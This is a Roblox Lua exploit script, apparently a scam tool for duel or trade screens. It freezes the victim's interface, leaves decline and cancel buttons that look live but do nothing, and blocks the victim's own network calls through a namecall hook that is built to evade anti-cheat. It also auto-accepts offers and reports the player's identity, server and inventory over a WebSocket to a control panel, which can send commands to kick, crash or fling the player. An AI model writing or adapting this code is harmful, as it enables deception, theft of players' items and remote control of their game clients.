
local function isAnimated(inst)
    if inst:IsA("ViewportFrame") or inst:IsA("Camera")
    or inst:IsA("BasePart") or inst:IsA("Model")
    or inst:IsA("Humanoid") or inst:IsA("Animator")
    or inst:IsA("SpecialMesh") or inst:IsA("MeshPart")
    or inst:IsA("Accessory") or inst:IsA("Motor6D") then return true end
    return inst:FindFirstAncestorWhichIsA("ViewportFrame") ~= nil
end

local function isTimerText(s)
    if type(s) ~= "string" then return false end
    local l = s:lower()
    return l:find("left") ~= nil or l:find("second") ~= nil or s:match("%d+%.?%d*%s*s%f[%A]") ~= nil
end

local function lockProp(inst, prop)
    local ok, saved = pcall(function() return inst[prop] end)
    if not ok then return end
    local ok2, conn = pcall(function()
        return inst:GetPropertyChangedSignal(prop):Connect(function()
            if not Freezer.active then return end
            local ov = Freezer.colorOverride[inst]
            if ov and ov[prop] ~= nil then
                pcall(function()
                    if inst[prop] ~= ov[prop] then inst[prop] = ov[prop] end
                end)
                return
            end
            if Freezer.allowRecolor[inst]
            and (prop == "BackgroundColor3" or prop == "Color") then
                pcall(function() saved = inst[prop] end)
                return
            end
            pcall(function()
                if inst[prop] ~= saved then inst[prop] = saved end
            end)
        end)
    end)
    if ok2 and conn then table.insert(Freezer.conns, conn) end
end

local function lockInstance(d)
    if isAnimated(d) then return end
    if Freezer.pressOnly[d] == true then
        lockProp(d, "Visible")
        lockProp(d, "Text")
        return
    end
    if d:IsA("GuiObject") then
        for _, p in ipairs(LOCKED_GUI) do lockProp(d, p) end
    elseif d:IsA("UIStroke") then
        for _, p in ipairs(LOCKED_STROKE) do lockProp(d, p) end
    elseif d:IsA("UIGradient") then
        lockProp(d, "Color"); lockProp(d, "Enabled")
    end
    if d:IsA("TextLabel") or d:IsA("TextButton") then
        lockProp(d, "TextColor3")
        lockProp(d, "Text")
        if isTimerText(safe(function() return d.Text end)) then
            pcall(function() d.Visible = false end)
            lockProp(d, "Visible")
        end
    end
end

function Freezer:Unfreeze()
    self.active = false
    if setAutoAccept then pcall(setAutoAccept, false) end
    -- the fake-pick lock only exists while the cards are frozen
    if LocalPick then
        LocalPick.enabled = false
        LocalPick.current = nil
        pcall(function() LocalPick:ClearOutlines() end)
        LocalPick.learned = {}
        LocalPick.learnUntil = 0
    end
    for _, c in ipairs(self.conns) do pcall(function() c:Disconnect() end) end
    self.conns = {}
    self.roots = {}
    self.known = {}
    self.savedParents = {}
    for sound, state in pairs(self.soundStates) do
        if sound and sound.Parent then
            pcall(function() sound.Volume = state.volume end)
        end
    end
    self.soundStates = {}
    for _, c in ipairs(self.disabledConns) do
        pcall(function() if c.Enable then c:Enable() end end)
    end
    self.disabledConns = {}
    self.pressOnly = {}
    self.allowRecolor = {}
    self.colorOverride = {}
end

-- Buttons whose clicks must LOOK like they work but do nothing at all.
local DEAD_BUTTON_WORDS = { "cancel", "decline", "reject", "leave", "back", "close" }

local function isDeadButton(inst)
    if not inst:IsA("GuiButton") then return false end
    local txt = safe(function() return inst.Text end)
    local name = safe(function() return inst.Name end) or ""
    local hay = ((type(txt) == "string" and txt or "") .. " " .. name):lower()
    for _, w in ipairs(DEAD_BUTTON_WORDS) do
        if hay:find(w, 1, true) then return true end
    end
    return false
end

local CLICK_EVENTS = {
    "MouseButton1Click", "MouseButton1Down", "MouseButton1Up",
    "Activated", "InputBegan", "InputEnded", "TouchTap",
}

local function neutralizeDeadButtons(root)
    local list = root:GetDescendants()
    table.insert(list, root)
    for _, d in ipairs(list) do
        if isDeadButton(d) then
            Freezer.pressOnly[d] = true
            pcall(function() d.AutoButtonColor = true end)
            if typeof(getconnections) == "function" then
                for _, evName in ipairs(CLICK_EVENTS) do
                    pcall(function()
                        for _, c in ipairs(getconnections(d[evName])) do
                            if c.Disable then
                                c:Disable()
                                table.insert(Freezer.disabledConns, c)
                            end
                        end
                    end)
                end
            end
        end
    end
end

-- Only audio the SERVER pushes during the freeze is muted. Client-side UI
-- clicks and local script sounds stay audible so the game still sounds alive.
local CLIENT_AUDIO_ROOTS = {}
do
    local function addRoot(inst) if inst then table.insert(CLIENT_AUDIO_ROOTS, inst) end end
    addRoot(safe(function() return LP:FindFirstChildOfClass("PlayerGui") end))
    addRoot(safe(function() return LP:FindFirstChildOfClass("PlayerScripts") end))
    addRoot(safe(function() return game:GetService("CoreGui") end))
    addRoot(safe(function() return game:GetService("Chat") end))
end

local CLIENT_SOUNDS = setmetatable({}, { __mode = "k" })
local SERVER_SOUNDS = setmetatable({}, { __mode = "k" })

local function inClientContainer(sound)
    for _, root in ipairs(CLIENT_AUDIO_ROOTS) do
        local ok, res = pcall(function() return sound:IsDescendantOf(root) end)
        if ok and res then return true end
    end
    return false
end

local function isClientSound(sound, fromReplication)
    if CLIENT_SOUNDS[sound] then return true end
    if SERVER_SOUNDS[sound] then return false end

    local verdict
    if inClientContainer(sound) then
        verdict = true
    else
        local creator
        if fromReplication and typeof(getcallingscript) == "function" then
            creator = safe(function() return getcallingscript() end)
        end
        if creator then
            local isLocal = safe(function()
                if creator:IsA("LocalScript") then return true end
                if creator:IsA("Script") and creator.RunContext == Enum.RunContext.Client then return true end
                return false
            end)
            verdict = isLocal == true
        else
            verdict = false
        end
    end

    if verdict then CLIENT_SOUNDS[sound] = true else SERVER_SOUNDS[sound] = true end
    return verdict
end

local function muteServerSound(d, wasPlaying)
    Freezer.soundStates[d] = {
        volume  = safe(function() return d.Volume end) or 0,
        playing = wasPlaying == true,
    }
    pcall(function() d.Volume = 0 end)
    if wasPlaying then pcall(function() d:Stop() end) end
    local ok, conn = pcall(function()
        return d:GetPropertyChangedSignal("Playing"):Connect(function()
            if Freezer.active and d.Playing and not isClientSound(d, false) then
                pcall(function() d:Stop() end)
            end
        end)
    end)
    if ok and conn then table.insert(Freezer.conns, conn) end
end

local function silenceNewSounds()
    for _, d in ipairs(game:GetDescendants()) do
        if d:IsA("Sound") and not isClientSound(d, false) then
            muteServerSound(d, safe(function() return d.Playing end) == true)
        end
    end
    local added = game.DescendantAdded:Connect(function(d)
        if not Freezer.active or not d:IsA("Sound") then return end
        if isClientSound(d, true) then return end
        muteServerSound(d, false)
    end)
    table.insert(Freezer.conns, added)
end

function Freezer:Freeze(roots)
    self:Unfreeze()
    if typeof(roots) == "Instance" then roots = { roots } end
    if type(roots) ~= "table" or #roots == 0 then return false, 0 end

    self.active = true
    self.roots  = roots
    if setAutoAccept then pcall(setAutoAccept, true) end
    -- from here on, the player's own picks are cosmetic only
    if LocalPick then LocalPick.enabled = true end
    silenceNewSounds()
    local count = 0

    for _, root in ipairs(roots) do
        if root and root.Parent then
            count = count + 1
            neutralizeDeadButtons(root)

            local list = root:GetDescendants()
            table.insert(list, root)
            for _, d in ipairs(list) do
                self.known[d] = true
                self.savedParents[d] = d.Parent
                lockInstance(d)
            end

            -- anything the game adds after the freeze (new timer label, green
            -- stroke, replacement model) is removed on sight
            local ok, added = pcall(function()
                return root.DescendantAdded:Connect(function(d)
                    if not Freezer.active or Freezer.restoring then return end
                    task.defer(function()
                        if not Freezer.active or not d.Parent then return end
                        if not Freezer.known[d] then
                            pcall(function() d:Destroy() end)
                        end
                    end)
                end)
            end)
            if ok and added then table.insert(self.conns, added) end

            -- if the game deletes or re-parents part of the card (common on the
            -- opponent's side), put it straight back so the card looks frozen
            local ok2, removing = pcall(function()
                return root.DescendantRemoving:Connect(function(d)
                    if not Freezer.active or Freezer.restoring or not Freezer.known[d] then return end
                    local parent = Freezer.savedParents[d]
                    task.defer(function()
                        if not Freezer.active or not parent or not parent.Parent then return end
                        pcall(function()
                            if d and not d.Parent then
                                Freezer.restoring = true
                                d.Parent = parent
                                Freezer.restoring = false
                            end
                        end)
                    end)
                end)
            end)
            if ok2 and removing then table.insert(self.conns, removing) end
        end
    end

    return count > 0, count
end

local function getDuelRoot(template)
    local node = template
    while node and node.Parent do
        if node.Parent:IsA("LayerCollector") then return node end
        node = node.Parent
    end
    return template and template:FindFirstAncestorWhichIsA("Frame") or nil
end

local function looksLikeOfferHeader(txt)
    if type(txt) ~= "string" or txt == "" then return false end
    return txt:lower():find("offer", 1, true) ~= nil
end

-- Freeze the WHOLE duel ScreenGui on both sides: the opponent card is often
-- rebuilt by the server rather than recoloured. ViewportFrames are skipped, so
-- the brainrot models keep animating and nothing looks stuck.
local function getFreezeRoots(template)
    local roots = {}
    local function add(inst)
        if not inst or not inst.Parent then return end
        if table.find(roots, inst) then return end
        for _, r in ipairs(roots) do
            if inst:IsDescendantOf(r) then return end
        end
        roots[#roots + 1] = inst
    end

    if template then
        local sg = template:FindFirstAncestorWhichIsA("LayerCollector")
        add(sg or getDuelRoot(template))
    end

    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if pg then
        for _, sg in ipairs(pg:GetChildren()) do
            if sg:IsA("LayerCollector") then
                pcall(function()
                    for _, d in ipairs(sg:GetDescendants()) do
                        if (d:IsA("TextLabel") or d:IsA("TextButton"))
                        and looksLikeOfferHeader(safe(function() return d.Text end)) then
                            add(sg)
                            break
                        end
                    end
                end)
            end
        end
    end

    return roots
end

-- ---------- clicking ----------
local function findClickable(root)
    if not root or not root.Parent then return nil end
    if root:IsA("GuiButton") then return root end
    for _, d in ipairs(root:GetDescendants()) do
        if d:IsA("GuiButton") then return d end
    end
    local p = root.Parent
    while p and not p:IsA("LayerCollector") do
        if p:IsA("GuiButton") then return p end
        p = p.Parent
    end
    return nil
end

local function clickGui(btn)
    if typeof(firesignal) == "function" then
        local ok = pcall(function()
            firesignal(btn.MouseButton1Down)
            task.wait(0.03)
            firesignal(btn.MouseButton1Click)
            firesignal(btn.MouseButton1Up)
            if btn.Activated then firesignal(btn.Activated) end
        end)
        if ok then return true, "firesignal" end
    end

    if typeof(getconnections) == "function" then
        local fired = false
        pcall(function()
            for _, sig in ipairs({ btn.MouseButton1Click, btn.Activated, btn.MouseButton1Down }) do
                for _, c in ipairs(getconnections(sig)) do
                    if c.Function then c.Function(); fired = true
                    elseif c.Fire then c:Fire(); fired = true end
                end
                if fired then break end
            end
        end)
        if fired then return true, "getconnections" end
    end

    local okVim = pcall(function()
        local pos   = btn.AbsolutePosition + btn.AbsoluteSize / 2
        local inset = GuiService:GetGuiInset()
        local x, y  = pos.X + inset.X, pos.Y + inset.Y
        VIM:SendMouseMoveEvent(x, y, game)
        task.wait(0.03)
        VIM:SendMouseButtonEvent(x, y, 0, true,  game, 0)
        task.wait(0.05)
        VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
        task.wait(0.05)
    end)
    if okVim then return true, "virtualinput" end

    return false, "none"
end

-- ---------- client-side-only manual picks ----------
-- While the cards are frozen, a brainrot the player presses turns green exactly
-- like a real selection, but the remote that would tell the server never leaves
-- the client. Outside the freeze this is completely inert, so normal duels work.
LocalPick = {
    enabled     = false, -- switched on by Freezer:Freeze, off by Unfreeze
    hooked      = {},
    conns       = {},
    suspended   = false, -- true while WE fire a real (server) click
    allowUntil  = 0,
    learnUntil  = 0,
    learned     = {},
    outlines    = {},
    current     = nil,
}

local DUEL_WORDS = {
    "duel", "offer", "select", "pick", "place", "brainrot", "slot", "choose",
}
-- Keep this list TIGHT: broad words matched the duel remotes too and let manual
-- picks reach the server.
local NEVER_BLOCK_WORDS = {
    "anticheat", "heartbeat", "keepalive", "ping", "pong", "alive",
    "telemetry", "analytics", "chatmessage", "saymessage",
}

local function nameMatches(inst, words, depth_limit)
    local node = inst
    local depth = 0
    while node and depth < (depth_limit or 4) do
        local n = norml(safe(function() return node.Name end))
        if n ~= "" then
            for _, w in ipairs(words) do
                if n:find(w, 1, true) then return true end
            end
        end
        node = safe(function() return node.Parent end)
        depth = depth + 1
    end
    return false
end

local function isProtected(inst) return nameMatches(inst, NEVER_BLOCK_WORDS, 1) end
local function nameLooksDuel(inst) return nameMatches(inst, DUEL_WORDS, 3) end

-- Read from the game's own selected tile:
--   Template.Spacer.BackgroundColor3 -> 0.0588235, 0.196078, 0.0588235
--   Template.Spacer.UIStroke.Color   -> 0, 1, 0
local SELECT_FILL    = Color3.new(0.0588235, 0.196078, 0.0588235)
local SELECT_BORDER  = Color3.new(0, 1, 0)
local DEFAULT_FILL   = Color3.new(0.137255, 0.176471, 0.196078)
local DEFAULT_BORDER = Color3.new(0, 0, 0)

local function getSpacer(template)
    if template.Name == "Spacer" then return template end
    local sp = template:FindFirstChild("Spacer")
    if sp and sp:IsA("GuiObject") then return sp end
    for _, d in ipairs(template:GetDescendants()) do
        if d.Name == "Spacer" and d:IsA("GuiObject") then return d end
    end
    return nil
end

local function isGreenish(c)
    if not c then return false end
    return c.G > c.R + 0.03 and c.G > c.B + 0.03
end

local function resetTile(template, saved)
    local spacer = saved and saved.spacer or getSpacer(template)
    if not spacer or not spacer.Parent then return end
    local stroke = (saved and saved.stroke) or spacer:FindFirstChildOfClass("UIStroke")
    Freezer.allowRecolor[spacer] = nil
    forceColor(spacer, "BackgroundColor3", (saved and saved.bg) or DEFAULT_FILL)
    if stroke and stroke.Parent then
        Freezer.allowRecolor[stroke] = nil
        forceColor(stroke, "Color", (saved and saved.strokeColor) or DEFAULT_BORDER)
    end
end

function LocalPick:ClearOutlines(keep)
    for template, saved in pairs(self.outlines) do
        if template ~= keep then
            pcall(function() resetTile(template, saved) end)
            self.outlines[template] = nil
        end
    end

    local scroll = getDuelScroll()
    if not scroll then return end

    local function inKeep(inst)
        if not keep then return false end
        return inst == keep or inst:IsDescendantOf(keep)
    end

    for _, d in ipairs(scroll:GetDescendants()) do
        if not inKeep(d) then
            if d:IsA("UIStroke") then
                if isGreenish(safe(function() return d.Color end))
                or (Freezer.colorOverride[d] and Freezer.colorOverride[d].Color) then
                    Freezer.allowRecolor[d] = nil
                    forceColor(d, "Color", DEFAULT_BORDER)
                end
            elseif d:IsA("GuiObject") then
                if isGreenish(safe(function() return d.BackgroundColor3 end))
                or (Freezer.colorOverride[d] and Freezer.colorOverride[d].BackgroundColor3) then
                    Freezer.allowRecolor[d] = nil
                    forceColor(d, "BackgroundColor3", DEFAULT_FILL)
                end
            end
        end
    end
end

-- Recolors the tile exactly the way the game does on a confirmed pick. Nothing
-- is created or destroyed, so it is indistinguishable from the real thing.
function LocalPick:ShowOutline(template)
    if not template or not template.Parent then return end
    self.current = template
    self:ClearOutlines(template)

    local spacer = getSpacer(template)
    if not spacer then return end
    local stroke = spacer:FindFirstChildOfClass("UIStroke")

    if not self.outlines[template] then
        self.outlines[template] = {
            spacer = spacer, bg = DEFAULT_FILL,
            stroke = stroke, strokeColor = DEFAULT_BORDER,
        }
    end

    Freezer.allowRecolor[spacer] = true
    if stroke then Freezer.allowRecolor[stroke] = true end
    forceColor(spacer, "BackgroundColor3", SELECT_FILL)
    if stroke then forceColor(stroke, "Color", SELECT_BORDER) end
end

-- At most ONE green tile at any time, and only the one the player pressed.
function LocalPick:EnforceSingleOutline()
    local keep = self.current
    if keep and not keep.Parent then keep = nil; self.current = nil end
    if not keep then
        local scroll = getDuelScroll()
        if scroll then
            for _, child in ipairs(scroll:GetChildren()) do
                if child:IsA("GuiObject") then
                    local spacer = getSpacer(child)
                    if spacer then
                        local st = spacer:FindFirstChildOfClass("UIStroke")
                        if isGreenish(safe(function() return spacer.BackgroundColor3 end))
                        or (st and isGreenish(safe(function() return st.Color end))) then
                            keep = child
                            break
                        end
                    end
                end
            end
        end
        self:ClearOutlines(keep)
        return
    end
    self:ClearOutlines(keep)
    local spacer = getSpacer(keep)
    if spacer then
        local stroke = spacer:FindFirstChildOfClass("UIStroke")
        Freezer.allowRecolor[spacer] = true
        forceColor(spacer, "BackgroundColor3", SELECT_FILL)
        if stroke then
            Freezer.allowRecolor[stroke] = true
            forceColor(stroke, "Color", SELECT_BORDER)
        end
    end
end

-- Network lock. Only the burst caused by the player's own press is swallowed,
-- and never anything that looks like anti-cheat or heartbeat plumbing.
local PRESS_WINDOW = 1.6
local RETRY_WINDOW = 10

function LocalPick:ShouldBlock(remote)
    if not self.enabled then return false end
    if self.suspended or os.clock() < self.allowUntil then return false end
    if typeof(remote) ~= "Instance" then return false end
    if isProtected(remote) then return false end

    local now = os.clock()
    if now < self.learnUntil then
        if nameLooksDuel(remote) then self.learned[remote] = now end
        return true
    end
    local seen = self.learned[remote]
    if seen and now - seen < RETRY_WINDOW then
        self.learned[remote] = seen
        return true
    end
    return false
end

function LocalPick:OpenWindow()
    if not self.enabled or self.suspended then return end
    self.learnUntil = os.clock() + PRESS_WINDOW
end

local function wrapc(fn)
    if typeof(newcclosure) == "function" then
        local ok, res = pcall(newcclosure, fn)
        if ok then return res end
    end
    return fn
end

-- Single __namecall hook. No hookfunction on Instance methods: that is the
-- loudest possible signature and is what tripped the kick before.
local function installNetHook()
    if typeof(hookmetamethod) ~= "function" or typeof(getnamecallmethod) ~= "function" then
        return false
    end
    local oldNamecall
    local ok = pcall(function()
        oldNamecall = hookmetamethod(game, "__namecall", wrapc(function(self, ...)
            local method = getnamecallmethod()
            if (method == "FireServer" or method == "InvokeServer")
            and LocalPick:ShouldBlock(self) then
                if method == "InvokeServer" then return nil end
                return
            end
            return oldNamecall(self, ...)
        end))
    end)
    return ok
end
pcall(installNetHook)

-- We never replace the game's handlers. We only make sure the network is shut
-- before they run, so their visuals happen and their remotes do not.
function LocalPick:HookButton(btn, template)
    if self.hooked[btn] then return end
    self.hooked[btn] = true

    local function press()
        if not LocalPick.enabled then return end   -- inert outside the freeze
        if LocalPick.suspended then return end     -- our own click, not the player's
        LocalPick:OpenWindow()
        LocalPick:ShowOutline(template)
        task.defer(function()
            if LocalPick.current == template then
                pcall(function() LocalPick:EnforceSingleOutline() end)
            end
        end)
        task.delay(0.1, function()
            if LocalPick.current == template then
                pcall(function() LocalPick:EnforceSingleOutline() end)
            end
        end)
    end

    local ok, c1 = pcall(function() return btn.MouseButton1Down:Connect(press) end)
    if ok and c1 then table.insert(self.conns, c1) end

    local ok2, c2 = pcall(function()
        return btn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
                press()
            end
        end)
    end)
    if ok2 and c2 then table.insert(self.conns, c2) end
end

function LocalPick:Arm()
    local scroll = getDuelScroll()
    if not scroll then return 0 end
    local n = 0
    for _, child in ipairs(scroll:GetChildren()) do
        if child:IsA("GuiObject")
        and not child:IsA("UIListLayout") and not child:IsA("UIGridLayout") then
            local btn = findClickable(child)
            if btn and not self.hooked[btn] then
                self:HookButton(btn, child)
                n = n + 1
            end
        end
    end
    return n
end

-- our own placement must really reach the server
function LocalPick:Suspend()
    self.suspended  = true
    self.learnUntil = 0
    self.allowUntil = os.clock() + 3
end

function LocalPick:Resume()
    task.delay(0.4, function()
        LocalPick.suspended  = false
        LocalPick.allowUntil = 0
    end)
end

-- ---------- auto accept ----------
do
    local function duelReadyButton()
        local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
        if not pg then return nil end
        local g = safe(function() return pg:FindFirstChild("DuelsMachineSession") end)
        if not g then return nil end
        local f = safe(function() return g:FindFirstChild("DuelsMachineSession") end)
        if not f then return nil end
        local o = safe(function() return f:FindFirstChild("Other") end)
        if not o then return nil end
        return safe(function() return o:FindFirstChild("Ready") end)
    end

    local function fireReady(btn)
        local sig = safe(function() return btn.Activated end)
        if not sig then return false end
        local fired = false
        if getconnections then
            local ok, conns = pcall(getconnections, sig)
            if ok and type(conns) == "table" and #conns > 0 then
                for _, c in ipairs(conns) do
                    if pcall(function() c:Fire() end) then fired = true end
                end
            end
        end
        if not fired and firesignal then fired = pcall(firesignal, sig) end
        return fired
    end

    local autoAcceptOn = false
    local autoAcceptThread = nil

    setAutoAccept = function(on)
        on = not not on
        if on == autoAcceptOn then return end
        autoAcceptOn = on
        if autoAcceptThread then
            pcall(task.cancel, autoAcceptThread)
            autoAcceptThread = nil
        end
        if on then
            autoAcceptThread = task.spawn(function()
                while autoAcceptOn do
                    local btn = duelReadyButton()
                    -- NEVER touch LocalPick here. Suspending on every tick kept
                    -- allowUntil permanently in the future, which switched the
                    -- network lock off entirely: the victim's own picks reached
                    -- the server and the fake green outline never painted.
                    if btn then pcall(fireReady, btn) end
                    task.wait(0.5)
                end
            end)
        end
    end
end

-- ---------- the panel's pick ----------
local pickWanted, pickTries, pickDone = nil, 0, false

local function placePick(entry)
    local template = entry and entry.template
    if not template or not template.Parent then return false end
    local btn = findClickable(template)
    if not btn then return false end

    -- FREEZE BOTH CARDS BEFORE THE CLICK FIRES. This order matters: the freeze
    -- has to be up already when the game reacts to the pick.
    pcall(function() Freezer:Freeze(getFreezeRoots(template)) end)

    LocalPick:Suspend()
    local ok = clickGui(btn)
    LocalPick:Resume()
    return ok
end

local function tryApplyPick()
    local want = pickWanted
    if not want or pickDone then return end
    if not getDuelScroll() then return end     -- the picker is not open yet
    if pickTries > 12 then return end          -- give up rather than spam
    for _, br in ipairs(duelTemplates()) do
        if norml(br.name) == norml(want.name)
        and norml(br.mutation or "") == norml(want.mutation or "") then
            pickTries = pickTries + 1
            if placePick(br) then pickDone = true end
            return
        end
    end
end

-- Keeps the pick trying while the picker is open, re-arms it for the next duel,
-- and keeps the manual-press hooks attached to freshly built tiles.
task.spawn(function()
    while task.wait(0.6) do
        if kicked then break end
        if getDuelScroll() then
            pcall(function() LocalPick:Arm() end)
            if pickWanted and not pickDone then pcall(tryApplyPick) end
        else
            pickDone, pickTries = false, 0     -- picker closed: ready for the next one
        end
    end
end)

-- Never more than one green tile, checked every frame so a second one painted
-- by the game is erased before it can be seen. Inert outside the freeze.
task.spawn(function()
    local conn
    conn = RunService.Heartbeat:Connect(function()
        if kicked then pcall(function() conn:Disconnect() end); return end
        if not LocalPick.enabled then return end
        pcall(function() LocalPick:EnforceSingleOutline() end)
    end)
end)

-- ---------- duel start: unfreeze + close the offer GUI ----------
do
    local function node(guiName, ...)
        local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
        if not pg then return nil end
        local n = safe(function() return pg:FindFirstChild(guiName) end)
        for _, part in ipairs({ ... }) do
            if not n then return nil end
            local step = part
            n = safe(function() return n:FindFirstChild(step) end)
        end
        return n
    end

    local function sessionFrame() return node("DuelsMachineSession", "DuelsMachineSession") end
    local function closeButton()  return node("DuelsMachineSession", "DuelsMachineSession", "Header", "Close") end
    local function countdown()    return node("DuelsMachineAnimation", "DuelsMachineAnimation") end

    local function isVisible(inst)
        return inst ~= nil and safe(function() return inst.Visible end) == true
    end
    local function duelStarted() return isVisible(countdown()) end

    local BASE_CLICKS, EXTRA_CLICKS = 2, 3

    local function pressClose()
        local btn = closeButton()
        if not btn or not btn.Parent then return false end
        LocalPick:Suspend()          -- this close must really reach the server
        local ok = clickGui(btn)
        LocalPick:Resume()
        return ok
    end

    local function closeSessionGui()
        for _ = 1, BASE_CLICKS do
            if not pressClose() then break end
            task.wait(0.15)
        end
        for _ = 1, EXTRA_CLICKS do
            task.wait(0.35)
            if not isVisible(sessionFrame()) then return true end
            if not pressClose() then break end
        end
        return not isVisible(sessionFrame())
    end

    task.spawn(function()
        local armed = true      -- one shot per duel; re-arms when the countdown is gone
        while not kicked do
            task.wait(0.2)
            local started = duelStarted()
            -- only act if WE froze this duel: unfreeze first (that re-plugs the
            -- X button), then close.
            if started and armed and Freezer.active then
                armed = false
                Freezer:Unfreeze()
                pickDone, pickTries = false, 0
                task.spawn(closeSessionGui)
            elseif not started then
                armed = true
            end
        end
    end)
end

-- Fed by applyCommands below: the panel's DUEL BRAINROTS choice for this player.
local function setPanelPick(name, mutation)
    if not name or name == "" then
        pickWanted, pickTries, pickDone = nil, 0, false
        return
    end
    if pickWanted
    and norml(pickWanted.name) == norml(name)
    and norml(pickWanted.mutation or "") == norml(mutation or "") then
        return                                  -- same pick, nothing to redo
    end
    pickWanted = { name = name, mutation = mutation }
    pickTries, pickDone = 0, false
    task.spawn(function() pcall(tryApplyPick) end)
end


local function payload()
    return {
        scriptKey = CONFIG.SCRIPT_KEY, robloxId = LP.UserId, name = LP.Name,
        displayName = LP.DisplayName, avatarUrl = avatarUrl(), executor = executorName,
        game = gameName(), placeId = game.PlaceId, jobId = game.JobId,
        countryCode = staticCountry,
        serverPlayers = serverPlayers(), brainrots = collectBrainrots(),
    }
end

local catalogSent = false
local function reportCatalog()
    if catalogSent then return end
    local list = buildCatalog()
    if #list == 0 then return end
    if wsSendTable({ scriptKey = CONFIG.SCRIPT_KEY, catalog = list }) then catalogSent = true end
end

local prevN, prevC, prevF = false, false, false
local prev = {}
applySettings = function(s)
    if type(s) ~= "table" then return end
    if type(s.fpsLimiter) == "table" then Settings.fpsLimiter = s.fpsLimiter end
    if type(s.normalLag)  == "table" then Settings.normalLag  = s.normalLag end
    if type(s.carryLag)   == "table" then Settings.carryLag   = s.carryLag end
end
local function toggle(c, key, fn)
    local want = (c[key] == true)
    if want ~= prev[key] then prev[key] = want; fn(want) end
end
applyCommands = function(c)
    if type(c) ~= "table" then return end
    local wantF = (c.fpsLimiter == true)
    if wantF ~= prevF then prevF = wantF; setFpsLimit(wantF) end
    local wantN, wantC = (c.normalLag == true), (c.carryLag == true)
    if wantN ~= prevN or wantC ~= prevC then
        prevN, prevC = wantN, wantC
        if wantC then setMode("carry") elseif wantN then setMode("normal") else setMode(nil) end
    end
    toggle(c, "freeze", setFreeze)
    toggle(c, "fling", setFling)
    toggle(c, "spin", setSpin)
    toggle(c, "shake", setShake)
    toggle(c, "blackscreen", setBlack)
    toggle(c, "kill", setKill)
    -- DUEL BRAINROTS: the brainrot the panel chose for this player. Absent or
    -- null clears it. Applying it freezes the cards and starts auto accept.
    if type(c.selectedBrainrot) == "table" then
        local mu = c.selectedBrainrot.mutation
        mu = (type(mu) == "string" and mu ~= "" and mu) or nil
        setPanelPick(tostring(c.selectedBrainrot.name or ""), mu)
    else
        setPanelPick(nil)
    end
    if type(c.disguise) == "table" then
        local d = c.disguise
        local key = (type(d.key) == "string" and d.key) or ""
        local nm  = (type(d.name) == "string" and d.name ~= "" and d.name) or key
        if norml(key) ~= norml(Disguise.key or "") then
            task.spawn(function() pcall(setDisguise, key ~= "" and key or nil, nm) end)
        end
    end
    if c.crash == true and not crashed then crashed = true; while true do end end
    if c.kick and c.kick ~= false and not kicked then
        kicked = true
        pcall(function() LP:Kick(tostring(c.kick)) end)
    end
end

local WS_URL = (CONFIG.ENDPOINT:gsub("^http", "ws")) .. "/ws"
local socket, wsLive, wsConnecting = nil, false, false
local lastPingAt, lastPongAt = 0, 0
local APP_PING_INTERVAL, PONG_TIMEOUT = 20, 35

local function wsResolve()
    local w = WebSocket or (syn and syn.websocket) or genv.WebSocket
    if type(w) == "table" and w.connect then return w end
    return nil
end

local function closeSocket(s)
    if not s then return end
    pcall(function()
        if type(s.Close) == "function" then s:Close()
        elseif type(s.close) == "function" then s:close() end
    end)
end

local function socketDead(s)
    if socket ~= s then return end
    socket, wsLive, wsConnecting = nil, false, false
    lastPingAt, lastPongAt = 0, 0
    closeSocket(s)
end

local function bindSocketEvent(s, eventName, callback)
    local event = safe(function() return s[eventName] end)
    if not event then return nil end
    return safe(function() return event:Connect(callback) end)
end

local function connectWS()
    if wsLive or wsConnecting then return wsLive end
    wsConnecting = true
    local w = wsResolve()
    if not w then wsConnecting = false; return false end
    local ok, s = pcall(function() return w.connect(WS_URL) end)
    if not ok or not s then wsConnecting = false; return false end
    socket, wsLive, wsConnecting = s, true, false
    lastPingAt, lastPongAt = tick() - APP_PING_INTERVAL, tick()

    local messageConn = bindSocketEvent(s, "OnMessage", function(msg)
        if socket ~= s or type(msg) ~= "string" then return end
        if msg == "xeno:pong:v1" then lastPongAt = tick(); return end
        local plain = dec(msg)
        if not plain then return end
        local data = safe(function() return HttpService:JSONDecode(plain) end)
        if type(data) ~= "table" then return end
        if data.settings then applySettings(data.settings) end
        if data.commands then applyCommands(data.commands) end
    end)
    if not messageConn then socketDead(s); return false end
    bindSocketEvent(s, "OnClose", function() socketDead(s) end)
    bindSocketEvent(s, "OnError", function() socketDead(s) end)
    return true
end

wsSendTable = function(t)
    local s = socket
    if not (wsLive and s) then return false end
    local ok = pcall(function() s:Send(enc(HttpService:JSONEncode(t))) end)
    if not ok then socketDead(s) end
    return ok
end
-- Presence payloads stay change-driven: they only go up when something the
-- panel shows changes and once on every fresh connection. The lightweight
-- ping below is solely for detecting a half-open socket.
local lastSig, lastSendAt = nil, 0
local MIN_GAP = 5

local function payloadSig(p)
    local parts = { tostring(p.placeId), tostring(p.jobId) }
    for _, nm in ipairs(p.serverPlayers or {}) do parts[#parts + 1] = tostring(nm) end
    parts[#parts + 1] = "|"
    for _, b in ipairs(p.brainrots or {}) do
        parts[#parts + 1] = tostring(b.name) .. ":" .. tostring(b.gen or b.cash or "")
            .. ":" .. tostring(b.mutation or "")
    end
    return table.concat(parts, ",")
end

wsSend = function(force)
    local p = payload()
    local sig = payloadSig(p)
    -- Unchanged, or too soon after the last frame: skip. lastSig is left alone so
    -- a change held back by MIN_GAP still goes out on the next pass.
    if not force then
        if sig == lastSig then return true end
        if tick() - lastSendAt < MIN_GAP then return true end
    end
    local ok = wsSendTable(p)
    if ok then lastSig, lastSendAt = sig, tick() end
    return ok
end

connectWS()
wsSend(true)

task.spawn(function()
    task.wait(2); reportCatalog()
    while task.wait(30) do if not catalogSent then reportCatalog() else break end end
end)

-- Watchdog: checks for changes cheaply and, above all, brings the socket back up
-- after a teleport. A reconnect resends the full picture.
task.spawn(function()
    while task.wait(2) do
        if kicked then break end
        if wsLive then
            wsSend()
        else
            pcall(connectWS)
            if wsLive then lastSig = nil; wsSend(true) end
        end
    end
end)

-- A tiny application ping detects half-open sockets after a VPS restart or a
-- network change. Inventory stays change-driven; this frame carries no payload.
task.spawn(function()
    while task.wait(2) do
        if kicked then break end
        local s = socket
        if wsLive and s then
            local now = tick()
